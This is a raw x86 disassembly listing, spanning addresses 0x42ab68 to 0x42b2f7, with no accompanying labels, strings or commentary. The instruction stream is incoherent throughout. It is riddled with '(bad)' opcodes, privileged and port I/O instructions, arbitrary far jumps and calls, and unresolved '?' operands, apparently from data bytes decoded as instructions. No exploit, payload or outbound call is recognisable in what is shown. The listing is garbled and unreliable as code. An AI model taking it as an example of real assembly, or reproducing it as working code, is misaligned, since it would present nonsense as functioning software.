  42ab68:	xor    ebx,ebx
  42ab6a:	arpl   WORD PTR gs:[ebx+0x38],bp
  42ab6e:	sub    al,0x9
  42ab70:	shl    dl,cl
  42ab72:	lods   eax,DWORD PTR ds:[esi]
  42ab73:	fisttp WORD PTR [ebp-0x36]
  42ab76:	pop    ss
  42ab77:	mov    dh,0xad
  42ab79:	ins    DWORD PTR es:[edi],dx
  42ab7a:	stos   BYTE PTR es:[edi],al
  42ab7b:	in     al,dx
  42ab7c:	mov    edi,0xea4a7f38
  42ab81:	cli    
  42ab82:	pop    esi
  42ab83:	xchg   ecx,eax
  42ab84:	retf   
  42ab85:	(bad)  
  42ab87:	inc    ebp
  42ab88:	gs dec ebx
  42ab8a:	jg     0x42ac02
  42ab8c:	int    0x0
  42ab8e:	mov    ch,0x2f
  42ab90:	add    BYTE PTR [edi+0x24],ch
  42ab93:	mov    cl,0x75
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	ins    BYTE PTR es:[edi],dx
  42ab97:	cmp    BYTE PTR [ecx+0x3546ce81],dl
  42ab9d:	das    
  42ab9e:	aaa    
  42ab9f:	mov    ebx,0x6c05d8d1
  42aba4:	sbb    eax,0x9d8412d2
  42aba9:	fwait
  42abaa:	das    
  42abab:	aad    0x6e
  42abad:	in     eax,dx
  42abae:	inc    edx
  42abaf:	dec    ecx
  42abb0:	xchg   esi,eax
  42abb1:	adc    DWORD PTR [ecx-0x77],ebx
  42abb4:	cs push edx
  42abb6:	add    eax,0x5ab71a0
  42abbb:	adc    dl,bh
  42abbd:	pop    eax
  42abbe:	sbb    DWORD PTR [ebx+ebx*2],edi
  42abc1:	test   al,0x76
  42abc3:	fstp   TBYTE PTR [esi]
  42abc5:	pop    ebx
  42abc6:	loopne 0x42ac27
  42abc8:	pop    DWORD PTR [eax-0x3bd0b53f]
  42abce:	ret    0x56c2
  42abd1:	adc    ecx,DWORD PTR [ecx+0x30a62c19]
  42abd7:	pop    ebx
  42abd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42abd9:	or     eax,0xf29c79c2
  42abde:	adc    al,0x1f
  42abe0:	adc    bh,BYTE PTR [ebx-0x48e44bd3]
  42abe6:	xchg   ebp,eax
  42abe7:	es ret 0xac01
  42abeb:	and    dl,al
  42abed:	push   ebx
  42abee:	cmp    BYTE PTR [edx],ch
  42abf0:	fdivr  QWORD PTR [edx+0x56df156a]
  42abf6:	mov    edi,0x6d199418
  42abfb:	add    BYTE PTR [eax+0x23],ah
  42abfe:	mov    ah,0x76
  42ac00:	imul   ebp,DWORD PTR [ecx-0x3e092461],0x86074b6
  42ac0a:	ss jno 0x42ac1d
  42ac0d:	ret    0x23d5
  42ac10:	and    edx,ebp
  42ac12:	push   esi
  42ac13:	mov    ebx,0xceeeda6d
  42ac18:	mov    eax,ds:0x3bb5e9b5
  42ac1d:	mov    ss,WORD PTR [esi-0x1fb7ed4a]
  42ac23:	xor    BYTE PTR [eax+0x55],ch
  42ac26:	mov    eax,0x6ed6db6d
  42ac2b:	xchg   ebp,eax
  42ac2c:	inc    ecx
  42ac2d:	push   edi
  42ac2e:	in     al,dx
  42ac2f:	into   
  42ac30:	mov    ecx,0x749e3fb9
  42ac35:	push   ss
  42ac36:	cmp    cl,BYTE PTR [edx+0x7d085b6e]
  42ac3c:	push   ss
  42ac3d:	mov    eax,edi
  42ac3f:	sti    
  42ac40:	test   DWORD PTR [ebp+0x7e02db6d],ecx
  42ac46:	mov    edi,0xff742c72
  42ac4b:	and    BYTE PTR [eax+ecx*1-0x323ebca0],dl
  42ac52:	data16 cli 
  42ac54:	(bad)  
  42ac55:	mov    al,0xb4
  42ac57:	cmp    eax,0xf991eb74
  42ac5c:	pop    DWORD PTR [edx+ebx*8]
  42ac5f:	mov    dh,0xc
  42ac61:	inc    esp
  42ac62:	or     eax,0xbb42c2d6
  42ac67:	push   0xac561b62
  42ac6c:	dec    esi
  42ac6d:	loop   0x42ac89
  42ac6f:	and    dh,BYTE PTR [ecx+0xec2e203]
  42ac75:	inc    eax
  42ac76:	cmp    al,0x56
  42ac79:	dec    eax
  42ac7a:	mov    fs,WORD PTR [edx-0x1d]
  42ac7d:	(bad)  
  42ac7e:	inc    ecx
  42ac7f:	inc    edx
  42ac80:	mov    esp,gs
  42ac82:	je     0x42ac6c
  42ac84:	out    0xca,eax
  42ac86:	or     eax,0x4e86b714
  42ac8b:	aas    
  42ac8c:	outs   dx,BYTE PTR ds:[esi]
  42ac8d:	addr16 hlt 
  42ac8f:	ins    DWORD PTR es:[edi],dx
  42ac90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac91:	push   esi
  42ac92:	fisubr DWORD PTR [esi+0x4b]
  42ac95:	lds    eax,FWORD PTR [ebp+0x2]
  42ac98:	sbb    bl,ch
  42ac9a:	retf   
  42ac9b:	test   eax,0xb6d11a71
  42aca0:	cld    
  42aca1:	rcr    BYTE PTR [ecx+edx*8],cl
  42aca4:	test   DWORD PTR ds:0x198ece00,0xb61581b9
  42acae:	pop    ebx
  42acaf:	or     eax,0x5476bed6
  42acb4:	inc    edi
  42acb5:	lods   eax,DWORD PTR ds:[esi]
  42acb6:	mov    ebx,0x6b69658
  42acbb:	ins    DWORD PTR es:[edi],dx
  42acbc:	jo     0x42ac9c
  42acbe:	push   edx
  42acbf:	pop    edi
  42acc0:	ins    BYTE PTR es:[edi],dx
  42acc1:	mov    eax,edi
  42acc3:	lea    ecx,[edx-0xa98da7b]
  42acc9:	dec    edx
  42acca:	sub    eax,0x2ed0bb9e
  42accf:	mov    ch,0x33
  42acd1:	sbb    dl,BYTE PTR [ebx-0x2d]
  42acd4:	bound  eax,QWORD PTR [edx]
  42acd6:	icebp  
  42acd7:	mov    DWORD PTR [esi],ecx
  42acd9:	fnsave [esi]
  42acdb:	dec    edx
  42acdc:	les    eax,FWORD PTR [edx+0x34]
  42acdf:	push   edi
  42ace0:	xor    eax,0x36d8775a
  42ace5:	mov    dh,0x96
  42ace7:	xchg   edx,eax
  42ace8:	sub    al,0xc4
  42acea:	mov    ch,0x34
  42acec:	out    0x2,eax
  42acee:	xchg   ecx,eax
  42acef:	fisubr DWORD PTR [esi-0x46e65e0]
  42acf5:	test   al,0xc1
  42acf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42acf8:	or     esp,DWORD PTR [edx+0x44d88b5b]
  42acfe:	jle    0x42acd9
  42ad00:	cmp    edx,ecx
  42ad02:	push   edx
  42ad03:	pop    ss
  42ad04:	mov    dh,0xda
  42ad06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad07:	add    BYTE PTR [edi+0x69345fb5],cl
  42ad0d:	(bad)  
  42ad0e:	cmp    eax,0xdb0b6d61
  42ad13:	push   ebx
  42ad14:	jne    0x42acd7
  42ad16:	inc    edi
  42ad17:	and    DWORD PTR [edx+eiz*1+0x20],0xb6d2ed6a
  42ad1f:	mov    al,0x77
  42ad21:	mov    esi,DWORD PTR [eax-0x14]
  42ad24:	enter  0x2cb1,0x14
  42ad28:	in     al,0x68
  42ad2a:	push   0xccadf2db
  42ad2f:	mov    esi,0xf13f0036
  42ad34:	cmp    al,0x47
  42ad36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad37:	stos   BYTE PTR es:[edi],al
  42ad38:	sbb    al,0x6d
  42ad3a:	jmp    0x42ad94
  42ad3c:	rcl    DWORD PTR [ebp-0x4c],cl
  42ad3f:	push   ecx
  42ad40:	adc    DWORD PTR [ecx+0x32],esi
  42ad43:	push   es
  42ad44:	mov    dl,0xb5
  42ad46:	mov    cl,0xdd
  42ad48:	mov    ecx,0xa42091a5
  42ad4d:	int3   
  42ad4e:	daa    
  42ad4f:	(bad)  
  42ad51:	mov    ch,0x4b
  42ad53:	cs mov dh,0x38
  42ad56:	fiadd  WORD PTR gs:0xed8907b7
  42ad5d:	(bad)  
  42ad5e:	mov    dh,0xb0
  42ad60:	adc    al,0xa5
  42ad62:	jbe    0x42ad1d
  42ad64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad65:	test   al,0x25
  42ad67:	pop    esp
  42ad68:	outs   dx,BYTE PTR ds:[esi]
  42ad69:	add    al,BYTE PTR [esi]
  42ad6b:	cmp    ch,BYTE PTR [eax-0x1a59d37b]
  42ad71:	fisttp QWORD PTR [eax-0x19]
  42ad74:	lea    ecx,[ebp-0x5cfe7ffa]
  42ad7a:	inc    ebx
  42ad7b:	dec    eax
  42ad7c:	dec    ecx
  42ad7d:	cld    
  42ad7e:	adc    ch,bl
  42ad80:	push   ss
  42ad81:	mov    dh,0xb6
  42ad83:	(bad)  
  42ad84:	push   edx
  42ad85:	rcl    DWORD PTR [eax+0x2f],cl
  42ad88:	and    dh,cl
  42ad8a:	dec    edx
  42ad8b:	cmp    eax,DWORD PTR [eax+0x3a403f36]
  42ad91:	sub    BYTE PTR [eax],ah
  42ad93:	ds xor eax,0x16d88369
  42ad99:	adc    BYTE PTR [ebp-0x5351e6e3],bl
  42ad9f:	enter  0xb689,0xb
  42ada3:	pop    ebx
  42ada4:	and    BYTE PTR [esi-0x1b],al
  42ada7:	mov    dl,0xc6
  42ada9:	jecxz  0x42adb4
  42adab:	sbb    dh,dl
  42adad:	inc    ecx
  42adae:	pop    ebp
  42adaf:	mov    al,ds:0xcc709364
  42adb4:	xlat   BYTE PTR ds:[ebx]
  42adb5:	ds inc edi
  42adb7:	mov    ah,0xdb
  42adb9:	rcl    dl,cl
  42adbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42adbc:	jp     0x42add6
  42adbe:	push   eax
  42adbf:	(bad)
  42adc2:	or     al,0x4d
  42adc4:	cs ins BYTE PTR es:[edi],dx
  42adc6:	ins    BYTE PTR es:[edi],dx
  42adc7:	sub    al,0x8e
  42adc9:	fcmovb st,st(6)
  42adcb:	and    eax,0xc99aa654
  42add0:	lock in eax,dx
  42add2:	inc    edx
  42add3:	in     al,0x8
  42add5:	(bad)  
  42add6:	xor    dl,BYTE PTR fs:[edx+0x6c2eb562]
  42addd:	or     esi,DWORD PTR [ecx]
  42addf:	jne    0x42ae40
  42ade1:	bnd jg 0x42ae0d
  42ade4:	push   0x68bad870
  42ade9:	mov    ebx,0x80880c4d
  42adee:	popf   
  42adef:	inc    ecx
  42adf0:	push   ss
  42adf1:	mov    edi,0xaa942eaf
  42adf6:	pop    ebp
  42adf7:	sub    BYTE PTR [edx],bl
  42adf9:	inc    ebp
  42adfa:	pop    edi
  42adfb:	mov    esp,0x2a4b1f22
  42ae00:	fsubr  DWORD PTR [esi+0x14]
  42ae03:	xor    al,0xcc
  42ae05:	lahf   
  42ae06:	sbb    al,0xc5
  42ae08:	pop    ebp
  42ae09:	(bad)  
  42ae0a:	inc    eax
  42ae0b:	fcomp  QWORD PTR [edx+0x63e055d2]
  42ae11:	jp     0x42adbc
  42ae13:	jbe    0x42adce
  42ae15:	ins    DWORD PTR es:[edi],dx
  42ae16:	lea    ebx,[ebx]
  42ae18:	in     eax,dx
  42ae19:	shr    BYTE PTR [ebx],1
  42ae1b:	ds sbb dh,bh
  42ae1e:	enter  0xd412,0xa6
  42ae22:	add    eax,0x32b040a8
  42ae27:	and    cl,ch
  42ae29:	clc    
  42ae2a:	scas   al,BYTE PTR es:[edi]
  42ae2b:	add    ch,BYTE PTR [esi+0x4b]
  42ae2e:	sahf   
  42ae2f:	inc    ecx
  42ae30:	or     BYTE PTR [edi+0x11da7b74],dh
  42ae36:	les    esp,FWORD PTR [ebp+0x5a30bf4d]
  42ae3c:	and    BYTE PTR [ebx-0x7f15a728],cl
  42ae42:	(bad)  
  42ae44:	cmp    BYTE PTR [ecx-0x2fe89ac2],dh
  42ae4a:	jbe    0x42aead
  42ae4c:	pop    ebx
  42ae4d:	addr16 (bad) 
  42ae4f:	mov    eax,ds:0xe2e52e7d
  42ae54:	ja     0x42ae85
  42ae56:	mov    dh,0xb
  42ae58:	push   0x43
  42ae5a:	fs in  eax,dx
  42ae5c:	sbb    eax,0xd4a7d761
  42ae61:	push   edi
  42ae62:	ins    BYTE PTR es:[edi],dx
  42ae63:	mov    bh,0xd6
  42ae65:	fist   DWORD PTR [eax]
  42ae67:	dec    BYTE PTR [ebp-0x56]
  42ae6a:	push   0xdb1075d4
  42ae6f:	lods   eax,DWORD PTR ds:[esi]
  42ae70:	and    ch,BYTE PTR [edi]
  42ae72:	mov    eax,0x7dac71a0
  42ae77:	add    DWORD PTR [eax-0x28],edx
  42ae7a:	fsub   DWORD PTR [esi-0x2b]
  42ae7d:	add    DWORD PTR [ebp-0x7f9252bf],ecx
  42ae83:	mov    eax,0x2747dde0
  42ae88:	cwde   
  42ae89:	pop    esp
  42ae8a:	mov    DWORD PTR [ebp-0x3fa3d5a8],ebp
  42ae90:	gs lahf 
  42ae92:	sub    eax,0x35b16222
  42ae97:	inc    ebp
  42ae98:	pop    esp
  42ae99:	cmp    bl,BYTE PTR [esi]
  42ae9b:	ins    DWORD PTR es:[edi],dx
  42ae9c:	sub    eax,0x1bd747b3
  42aea1:	sub    BYTE PTR [esi],0x1a
  42aea4:	pop    edi
  42aea5:	in     eax,dx
  42aea6:	inc    esi
  42aea7:	xor    dl,BYTE PTR [ecx]
  42aea9:	mov    DWORD PTR [ecx+0x5c],0x5f9d0ada
  42aeb0:	stos   BYTE PTR es:[edi],al
  42aeb1:	add    eax,0x152e3a7f
  42aeb6:	das    
  42aeb7:	jbe    0x42af2b
  42aeb9:	enter  0x1874,0xdc
  42aebd:	lds    eax,FWORD PTR [edi+0x57]
  42aec0:	mov    al,0x6d
  42aec2:	and    dl,BYTE PTR [eax+eax*8]
  42aec5:	cli    
  42aec6:	sub    edi,0x44
  42aec9:	repnz add eax,0x4d205bb6
  42aecf:	cmp    dl,al
  42aed1:	je     0x42af49
  42aed3:	push   es
  42aed4:	mov    ch,0x0
  42aed6:	jmp    0x42af2b
  42aed8:	cmp    cl,BYTE PTR [edx+0x22e4c536]
  42aede:	inc    edx
  42aedf:	mov    WORD PTR [edx+0x5dadc0c3],es
  42aee5:	fdiv   st,st(2)
  42aee7:	mov    DWORD PTR [esi-0x63],eax
  42aeea:	xlat   BYTE PTR ds:[ebx]
  42aeeb:	mov    ecx,0x5b25b798
  42aef0:	pop    ss
  42aef1:	dec    ebp
  42aef2:	add    BYTE PTR [ecx],cl
  42aef4:	or     al,0xd5
  42aef6:	cmp    eax,0x1b029265
  42aefb:	sbb    eax,0x63452344
  42af00:	mov    BYTE PTR [ecx],ah
  42af02:	fcmovnb st,st(6)
  42af04:	ret    0x4ac2
  42af07:	pop    ebx
  42af08:	fs std 
  42af0a:	and    bh,BYTE PTR [ebx-0x53]
  42af0d:	jecxz  0x42ae98
  42af0f:	cmp    DWORD PTR [eax-0x3a0249ea],esp
  42af15:	push   ebp
  42af16:	sbb    al,0x56
  42af18:	and    DWORD PTR [edx],ebx
  42af1a:	add    ch,BYTE PTR [esi+0x5d]
  42af1d:	mov    es:0x756b8574,al
  42af23:	shl    DWORD PTR [esi+0x1196db6d],0xce
  42af2a:	push   eax
  42af2b:	ficomp DWORD PTR ds:0x8f1b4745
  42af31:	adc    eax,0x96db6b68
  42af36:	or     cl,dl
  42af38:	ds sti 
  42af3a:	mov    eax,ds:0xc68ebb
  42af3f:	pop    ebx
  42af40:	push   esp
  42af41:	add    eax,0x4b819b2c
  42af46:	pop    ebp
  42af47:	adc    DWORD PTR [edi-0x77],ecx
  42af4a:	enter  0x90bf,0x41
  42af4e:	out    dx,eax
  42af4f:	fdiv   QWORD PTR [esi+0x5986b62f]
  42af55:	test   al,0x66
  42af57:	jmp    0x42afb8
  42af59:	sbb    dl,BYTE PTR [edi]
  42af5b:	ror    DWORD PTR [ebx+0x6db4fb42],cl
  42af61:	test   BYTE PTR [edx],bl
  42af63:	ret    0xb0e3
  42af66:	sbb    BYTE PTR [ecx-0x257980ec],bh
  42af6c:	mov    edx,0xa3a8dfc0
  42af71:	and    bh,dh
  42af73:	cmp    eax,0xad406ba3
  42af78:	and    DWORD PTR [esi-0x745e6904],0xc45db50e
  42af82:	ins    DWORD PTR es:[edi],dx
  42af83:	jecxz  0x42afa8
  42af85:	mov    al,0x13
  42af87:	pop    ebx
  42af88:	dec    esp
  42af89:	jne    0x42b005
  42af8b:	jmp    0xec17:0x83b96b46
  42af92:	or     edi,DWORD PTR [eax+0x5b883d90]
  42af98:	or     eax,0x559aed0
  42af9d:	xor    DWORD PTR [esi],ecx
  42af9f:	pop    ecx
  42afa0:	and    ch,BYTE PTR [edx]
  42afa2:	xor    eax,0x18826c11
  42afa7:	mov    eax,ds:0x1545a558
  42afac:	inc    ebp
  42afad:	mov    ecx,DWORD PTR [edx]
  42afaf:	mov    ah,0x23
  42afb1:	outs   dx,DWORD PTR ds:[esi]
  42afb2:	je     0x42aff5
  42afb4:	dec    ebx
  42afb5:	push   esp
  42afb6:	ins    DWORD PTR es:[edi],dx
  42afb7:	mov    ebx,0xcefa37c3
  42afbc:	fld    DWORD PTR [edi+0x5a]
  42afbf:	stc    
  42afc0:	fdiv   DWORD PTR [esi]
  42afc2:	dec    edx
  42afc3:	or     ebx,DWORD PTR [ebx-0x20]
  42afc6:	xor    eax,0x92b30e48
  42afcb:	jo     0x42af76
  42afcd:	pop    ebp
  42afce:	fcomp  DWORD PTR [edi+0x5240c7c8]
  42afd4:	pop    ss
  42afd5:	enter  0x1f9a,0x1
  42afd9:	mov    bh,0x6d
  42afdb:	mov    ds:0x53a71228,eax
  42afe0:	sbb    ebp,DWORD PTR [ebx+0x2d]
  42afe3:	or     esp,edx
  42afe5:	ficom  DWORD PTR [edx+0x57]
  42afe8:	jne    0x42af95
  42afea:	and    ecx,DWORD PTR [ebp-0x4e4bc3f8]
  42aff0:	jge    0x42afa2
  42aff2:	or     edi,DWORD PTR [edi-0x35]
  42aff5:	ds mov al,0xdd
  42aff8:	adc    dh,BYTE PTR [ecx+0x40]
  42affb:	sub    al,0x44
  42affd:	sub    al,0x98
  42afff:	jmp    FWORD PTR [edx+0xa6dad2d]
  42b005:	jbe    0x42b048
  42b007:	push   ebp
  42b008:	mov    WORD PTR [edx-0x28973ba6],?
  42b00e:	dec    esp
  42b00f:	add    al,0x97
  42b011:	mov    dh,0xf1
  42b013:	in     al,dx
  42b014:	push   edi
  42b015:	je     0x42b076
  42b017:	mov    gs:0x8add0536,al
  42b01d:	adc    edx,eax
  42b01f:	inc    ecx
  42b020:	(bad)  
  42b021:	xchg   esi,eax
  42b022:	push   ebp
  42b023:	push   eax
  42b024:	jne    0x42b001
  42b026:	(bad)  
  42b027:	sub    al,0xec
  42b029:	inc    ebx
  42b02a:	mov    bl,0xe4
  42b02c:	xor    bl,BYTE PTR [ebp-0x25]
  42b02f:	mov    dh,0xb5
  42b031:	jne    0x42b02d
  42b033:	dec    esp
  42b034:	add    DWORD PTR [eax+0x758fba7c],0xffffff89
  42b03b:	jp     0x42afeb
  42b03d:	call   0x88030308
  42b042:	mov    edx,0x687c8cf3
  42b047:	fmul   QWORD PTR [edx]
  42b049:	mov    bh,0x6b
  42b04b:	bound  ecx,QWORD PTR [eax-0x369a3249]
  42b051:	sbb    dh,0xad
  42b054:	lods   eax,DWORD PTR ds:[esi]
  42b055:	ins    DWORD PTR es:[edi],dx
  42b056:	pop    ss
  42b057:	cmp    DWORD PTR ds:0x17c6d722,ebx
  42b05d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b05e:	popf   
  42b05f:	popf   
  42b060:	test   eax,0x938161a0
  42b065:	mov    ebp,0x44c7b24f
  42b06a:	(bad)  [esi-0x4cfb6530]
  42b070:	lods   al,BYTE PTR ds:[esi]
  42b071:	and    al,0xe
  42b073:	cdq    
  42b074:	aam    0x9c
  42b076:	lods   eax,DWORD PTR ds:[esi]
  42b077:	sub    DWORD PTR [eax+0x7a0c6c8d],eax
  42b07d:	pcmpgtb mm7,QWORD PTR [eax]
  42b080:	shl    BYTE PTR [esi+0x6b],cl
  42b083:	fisttp DWORD PTR ds:0x2cd39ba6
  42b089:	sti    
  42b08a:	popf   
  42b08b:	sub    al,0xaa
  42b08d:	jmp    0x3752fe63
  42b092:	ficom  DWORD PTR [esi-0x7a]
  42b095:	data16 sar cl,0x8b
  42b099:	dec    esp
  42b09a:	mov    es,WORD PTR [edx+0x380b4bad]
  42b0a0:	pop    eax
  42b0a1:	mov    eax,0x1b6c06bb
  42b0a6:	pop    ebp
  42b0a7:	lds    edx,FWORD PTR [ebx-0x7c]
  42b0aa:	nop
  42b0ab:	or     ebx,DWORD PTR [edx+0x12]
  42b0ae:	cmp    bl,ah
  42b0b0:	mov    eax,0x832c2e95
  42b0b5:	pop    ebp
  42b0b6:	jae    0x42b119
  42b0b8:	shl    BYTE PTR [edi+0x119ee335],1
  42b0be:	jno    0x42b069
  42b0c0:	test   eax,0xdeb09316
  42b0c5:	push   0xd85140ad
  42b0ca:	push   ebp
  42b0cb:	jne    0x42b09e
  42b0cd:	xchg   ecx,eax
  42b0ce:	sub    ecx,DWORD PTR [eax]
  42b0d0:	mov    ds:0x3ac6ad85,eax
  42b0d5:	mov    ebp,0x82f7a0a5
  42b0da:	and    BYTE PTR [ebp+0x7105db6d],dh
  42b0e0:	xor    DWORD PTR ds:0x4d816fbd,esp
  42b0e6:	jb     0x42b147
  42b0e8:	pop    ebx
  42b0e9:	adc    eax,esp
  42b0eb:	(bad)  
  42b0ec:	pusha  
  42b0ed:	push   es
  42b0ee:	ret    
  42b0ef:	retf   
  42b0f0:	sbb    al,0x7
  42b0f2:	sub    DWORD PTR [esi],eax
  42b0f4:	pusha  
  42b0f5:	fistp  DWORD PTR [edx-0x2f0ea380]
  42b0fb:	ja     0x42b098
  42b0fd:	sbb    al,dl
  42b0ff:	ror    DWORD PTR [edx],1
  42b101:	pop    ebx
  42b102:	mov    ds:0xb2369ec6,eax
  42b107:	cmp    DWORD PTR [ebp+0xab605d],ebp
  42b10d:	shr    DWORD PTR [ebp+0x50464ee7],cl
  42b113:	adc    al,0xa6
  42b115:	mov    BYTE PTR [ebp-0x30],cl
  42b118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b119:	test   al,0xc6
  42b11b:	fsub   DWORD PTR [edx+0x36]
  42b11e:	mov    ch,BYTE PTR [edx-0x2c393ba3]
  42b124:	or     bh,BYTE PTR [edx+0x70a36dc8]
  42b12a:	jmp    0x42b0ee
  42b12c:	cld    
  42b12d:	lds    esi,FWORD PTR ds:0xd9e17699
  42b133:	out    dx,eax
  42b134:	fist   DWORD PTR [esi-0x6]
  42b137:	rcr    DWORD PTR [esi+0x5fd9fed8],0x86
  42b13e:	or     esp,DWORD PTR [esi]
  42b140:	mov    eax,ds:0xabf6dab9
  42b145:	dec    ebx
  42b146:	or     ch,cl
  42b148:	test   BYTE PTR [edi-0xd],dh
  42b14b:	popf   
  42b14c:	jp     0x42b0f3
  42b14e:	sbb    al,BYTE PTR [esi+0x5b]
  42b151:	mov    al,ds:0x9c63eb16
  42b156:	scas   al,BYTE PTR es:[edi]
  42b157:	dec    edx
  42b158:	dec    eax
  42b159:	push   ss
  42b15a:	cmp    cl,BYTE PTR [edx+0x33bcbddb]
  42b160:	lds    ebx,FWORD PTR [eax-0x476f0e9c]
  42b166:	mov    ah,ch
  42b168:	xchg   edi,eax
  42b169:	jno    0x42b172
  42b16b:	inc    ebx
  42b16c:	add    BYTE PTR [edx-0x4a60af17],bl
  42b172:	mov    ds:0x67b545ba,eax
  42b177:	sbb    BYTE PTR [eax+0x77],0x14
  42b17b:	push   0x7c
  42b17d:	ficom  DWORD PTR [ebp+eiz*2-0x7e]
  42b181:	js     0x42b1c4
  42b183:	sub    esi,edx
  42b185:	test   al,0xba
  42b187:	push   esp
  42b188:	fsub   DWORD PTR [edx]
  42b18a:	in     eax,dx
  42b18b:	scas   eax,DWORD PTR es:[edi]
  42b18c:	mov    ?,WORD PTR [edx+eiz*8+0x6db45d68]
  42b193:	add    bh,dl
  42b195:	test   al,0xd5
  42b197:	adc    ebp,esi
  42b199:	dec    ebp
  42b19a:	push   ss
  42b19b:	ins    DWORD PTR es:[edi],dx
  42b19c:	mov    ebx,0x87f56d6d
  42b1a1:	fstp   DWORD PTR [edi]
  42b1a3:	xchg   dl,bh
  42b1a5:	xchg   edi,eax
  42b1a6:	or     ah,0x29
  42b1a9:	dec    edx
  42b1aa:	inc    eax
  42b1ab:	dec    ebx
  42b1ac:	pop    ebx
  42b1ad:	test   ebp,esi
  42b1af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1b0:	sbb    eax,0xb616dbcf
  42b1b5:	lea    esi,[ecx]
  42b1b7:	jle    0x42b14e
  42b1b9:	dec    eax
  42b1ba:	icebp  
  42b1bb:	retf   
  42b1bc:	sub    DWORD PTR [edi-0x59],edi
  42b1bf:	mov    BYTE PTR [esi+0x63],dh
  42b1c2:	popa   
  42b1c3:	add    BYTE PTR [ecx],0xdb
  42b1c6:	stos   DWORD PTR es:[edi],eax
  42b1c7:	pop    ss
  42b1c8:	call   FWORD PTR [ecx-0x5f]
  42b1cb:	ins    DWORD PTR es:[edi],dx
  42b1cc:	sub    BYTE PTR ds:0x3b43141e,0xb9
  42b1d3:	xor    bh,ch
  42b1d5:	mov    ch,0x6d
  42b1d7:	pop    es
  42b1d8:	jne    0x42b208
  42b1da:	gs jge 0x42b22f
  42b1dd:	mov    dl,0x7d
  42b1df:	std    
  42b1e0:	push   esi
  42b1e1:	jmp    0x42b18d
  42b1e3:	mov    edx,0xc7c4adb5
  42b1e8:	out    dx,al
  42b1e9:	call   0x8585:0xc6475d1f
  42b1f0:	ins    DWORD PTR es:[edi],dx
  42b1f1:	test   eax,0x5876b08c
  42b1f6:	and    bh,0x3f
  42b1f9:	dec    eax
  42b1fa:	ins    DWORD PTR es:[edi],dx
  42b1fb:	fld    TBYTE PTR [eax-0x49]
  42b1fe:	inc    esp
  42b1ff:	push   cs
  42b200:	test   al,0xa4
  42b202:	dec    esi
  42b203:	scas   al,BYTE PTR es:[edi]
  42b204:	xchg   BYTE PTR [esi-0x752492bf],ch
  42b20a:	lea    edi,[eax+0x30]
  42b20d:	in     al,dx
  42b20e:	push   ds
  42b20f:	pop    es
  42b210:	push   0xadb6feed
  42b215:	add    eax,DWORD PTR [eax-0x46b851c]
  42b21b:	mov    dh,0x11
  42b21d:	repz sub eax,0x92dd0034
  42b223:	or     ah,BYTE PTR [esi-0x73c83426]
  42b229:	inc    ebp
  42b22a:	aad    0xc5
  42b22c:	mov    dh,0xe3
  42b22e:	leave  
  42b22f:	fwait
  42b230:	push   cs
  42b231:	int3   
  42b232:	push   0xffffffa9
  42b234:	and    esp,eax
  42b236:	(bad)  
  42b237:	pop    ecx
  42b238:	push   cs
  42b239:	mov    ecx,0xa5b9bb76
  42b23e:	mov    ecx,0x6172b62e
  42b243:	popa   
  42b244:	xchg   edi,eax
  42b245:	push   ss
  42b246:	jb     0x42b1ec
  42b248:	daa    
  42b249:	outs   dx,DWORD PTR ds:[esi]
  42b24a:	pop    ebp
  42b24b:	push   0x9e7db500
  42b250:	popf   
  42b251:	or     eax,0x970ae240
  42b256:	fisubr DWORD PTR [ebp-0x45fdb2a1]
  42b25c:	xor    eax,0xc7598a7a
  42b261:	ins    BYTE PTR es:[edi],dx
  42b262:	dec    ebp
  42b263:	inc    eax
  42b264:	fsub   QWORD PTR [esi]
  42b266:	push   edx
  42b267:	push   esp
  42b268:	dec    edx
  42b269:	push   edx
  42b26a:	adc    DWORD PTR [ebp+0x41],esi
  42b26d:	(bad)  [esi-0x40afffbf]
  42b273:	or     eax,0x60822e6b
  42b278:	fcmovnu st,st(0)
  42b27a:	push   0x25
  42b27c:	xchg   esp,eax
  42b27d:	stos   DWORD PTR es:[edi],eax
  42b27e:	mov    cl,0xc2
  42b280:	jnp    0x42b247
  42b282:	jb     0x42b22d
  42b284:	ins    DWORD PTR es:[edi],dx
  42b285:	dec    eax
  42b286:	shl    DWORD PTR [ebx-0x4d],0xce
  42b28a:	sub    ebx,DWORD PTR [esi+0x69634228]
  42b290:	pop    es
  42b291:	xchg   bp,ax
  42b293:	jmp    0x42b2be
  42b295:	mov    ah,0xf2
  42b297:	call   0xc430:0xd6d2db85
  42b29e:	stos   BYTE PTR es:[edi],al
  42b29f:	push   cs
  42b2a0:	xor    al,0x32
  42b2a2:	and    edi,esp
  42b2a4:	push   ss
  42b2a5:	call   0xfe880dfb
  42b2aa:	push   ds
  42b2ab:	int3   
  42b2ac:	fist   DWORD PTR [esi-0x45]
  42b2af:	pusha  
  42b2b0:	(bad)  [edx-0x26]
  42b2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2b4:	mov    dh,0x55
  42b2b6:	pop    ds
  42b2b7:	xor    eax,0x6db8d406
  42b2bc:	or     esp,DWORD PTR [esp+ebp*4+0x41]
  42b2c0:	int    0x5f
  42b2c2:	xor    DWORD PTR [edi-0x6d],0x56b6176b
  42b2c9:	push   ebp
  42b2ca:	push   ebx
  42b2cb:	in     eax,dx
  42b2cc:	loop   0x42b337
  42b2ce:	sbb    eax,0xd02ed162
  42b2d3:	adc    eax,0x942fd774
  42b2d8:	or     al,0x33
  42b2da:	push   eax
  42b2db:	(bad)  
  42b2dc:	mov    ebx,0xa146db1
  42b2e1:	aas    
  42b2e2:	repnz fidivr DWORD PTR [eax+eiz*2+0x6871107b]
  42b2ea:	push   eax
  42b2eb:	fild   DWORD PTR [esi+0x6c]
  42b2ee:	fimul  WORD PTR [ebp+0x1d]
  42b2f1:	jmp    0x5ba61e61
  42b2f6:	aaa    
  42b2f7:	push   0x44
